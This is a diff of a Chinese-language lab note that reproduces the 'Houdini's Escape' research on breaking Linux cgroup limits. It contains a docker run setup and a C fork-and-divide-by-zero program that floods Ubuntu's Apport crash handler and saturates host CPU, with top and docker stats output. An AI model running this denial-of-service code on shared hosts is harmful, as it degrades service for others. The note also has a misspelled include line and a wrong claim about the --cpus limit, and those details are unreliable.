@@ -66,11 +66,102 @@ Cgroup 相关的 resource controller 一共有四种
 
 #### case 1: Exception Handling
 
-constrains
+##### constrains
 
 * cpu core: 1
 * cpu share: 100%, 10%, 5%
 * pid limitation: None, 100, 50
+
+##### method
+
+首先确保安装了 docker[^note4] 并且下载了 ubuntu 镜像。若没有下载，在第一次运行该镜像时会自动下载。
+
+接下来明确 docker run 的参数以及观察 cpu 使用情况时用到的工具。
+
+
+
+docker run 语句如下
+
+```shell
+$ docker run --cpuset-cpus="0" --cpus=0.9 --pids-limit=50 -v /home/zty/dev/cfile:/tmp/cfile --rm -it ubuntu
+```
+
+* 这里没有像论文里说的那样用 user namespace 来实现非 root，考虑后续实现
+
+讲解一下基本的参数，更多的参数说明请参考官方文档[^note5]
+
+* *--cpuset-cpus* 指定了 container 运行在哪个 cpu core 上，可以指定单个或者多个
+* *--cpus* 指定了 container 可以使用 cpu 资源的上限，举例来说，上述语句里面的值为 0.9，那么 container 可以使用的 cpu 资源上限就是 10%，也可以用 * --cpu-period* 和 * --cpu-quota* 捆绑使用来[实现相同的功能]( https://docs.docker.com/engine/reference/run/#cpu-period-constraint )[^note6]
+* *--pids-limit* 指定了进程数目的上线，一旦超过这个上限，就会返回 *fork: Interrupted system call* 的错误信息
+* 剩下的 *-v* 是文件映射，为了执行在 Host 上编译生成的文件
+
+
+
+接下来需要做的是编写 expoit code，用来制造 faults 从而实现 escape from parrent cgroup。
+
+编写的文件如下
+
+```c
+#inlude <stdio.h>
+#include <unistd.h>
+int main()
+{
+    while(1) {
+        int pid = fork();
+        if(pid >0) {
+            int i = 1 / 0;
+            return 0;
+        }
+    }   
+    return 0;
+}
+```
+
+逻辑很简单，父进程在不停的循环执行 fork 操作，而成功生成的子进程则负责执行 *div 0* 操作引发 faults。具体产生的 fault 如下
+
+```
+Floating point exception(core dumped)
+```
+
+将该文件编译好之后，可以尝试运行，但由于会不断的制造 fault，造成 Host 的 cpu 直接被占满，我在实验的时候根本就无法进行后续操作了，只能重启电脑。
+
+按照论文里面的说法，对于 Ubuntu 而言，处理这些 faults 的应用是 Apport，因此在我们执行这个程序的时候，Apport 进程将会大量产生，从而占满 cpu。
+
+下面的是运行 top 命令对于该文件运行时的监控
+
+```
+top - 01:51:50 up  1:15,  1 user,  load average: 13.21, 3.12, 1.67
+Tasks: 386 total,  52 running, 264 sleeping,   0 stopped,   0 zombie
+%Cpu0  : 83.8 us, 16.2 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+%Cpu1  : 87.4 us, 12.6 sy,  0.0 ni,  0.0 id,  0.0 wa,  0.0 hi,  0.0 si,  0.0 st
+KiB Mem :  4012220 total,   940224 free,  1877100 used,  1194896 buff/cache
+KiB Swap:  1942896 total,  1928816 free,    14080 used.  1886840 avail Mem 
+
+   PID USER      PR  NI    VIRT    RES    SHR S  %CPU %MEM     TIME+ COMMAND
+ 40242 root      20   0   98800  24256  11648 R   2.8  0.6   0:00.09 apport
+ 40286 root      20   0   98800  24360  11752 R   2.8  0.6   0:00.09 apport
+ 40288 root      20   0   98800  24392  11784 R   2.8  0.6   0:00.09 apport
+ 40294 root      20   0   98800  24376  11768 R   2.8  0.6   0:00.09 apport
+ 40290 root      20   0   98800  24452  11844 R   2.5  0.6   0:00.08 apport
+ 40292 root      20   0   98800  24468  11860 R   2.5  0.6   0:00.08 apport
+ 40342 root      20   0   98244  23092  11216 R   2.5  0.6   0:00.08 apport
+ 40344 root      20   0   98244  23396  11256 R   2.5  0.6   0:00.08 apport
+ 40350 root      20   0   98244  23280  11400 R   2.5  0.6   0:00.08 apport
+ 40358 root      20   0   98244  23580  11444 R   2.5  0.6   0:00.08 apport 
+```
+
+运行 top 命令之后按下数字键盘中的 1，可以分不同的 core 来展示 cpu 的使用量，上图是运行的一个截图，并不是稳定的值，只是 cpu 被无数个 apport 占满时的一个时刻的情况
+
+而此刻，我也用 *docker stats* 命令监视着容器的情况
+
+```
+NAME                CPU %       MEM USAGE / LIMIT     MEM %    PIDS
+hardcore_knuth      6.97%       11.23MiB / 3.826GiB   0.29%    50
+```
+
+为了方便展示，我把 container ID，Net I/O，Block I/O 这些字段删除了，重点关注容器的 cpu 占用，我们发现短时间内 cpu 使用率为 7% 左右，也符合之前设定的 10% 以内，因此在这种情况下，其实是 Apport 这个 core dump application 占用了大量的 CPU。
+
+* 进一步的说明将在明天进行
 
 
 
@@ -92,4 +183,8 @@ constrains
 
 [^note2]: Gao, Xing, et al. "Houdini’s Escape: Breaking the Resource Rein of Linux Control Groups." (2019).
 [^note3]: The 26th ACM Conference on Computer and Communications Security in **London, United Kingdom from November 11 to November 15, 2019**.
+
+[^note4]: Docker installation and configuration: https://tianyuzhou.top/wiki/docker-install/.
+[^note5]:Docker official Documentation of docker run command:  https://docs.docker.com/engine/reference/commandline/run/.
+[^note6]: Docker container cpu period constaint: https://docs.docker.com/engine/reference/run/#cpu-period-constraint.
 
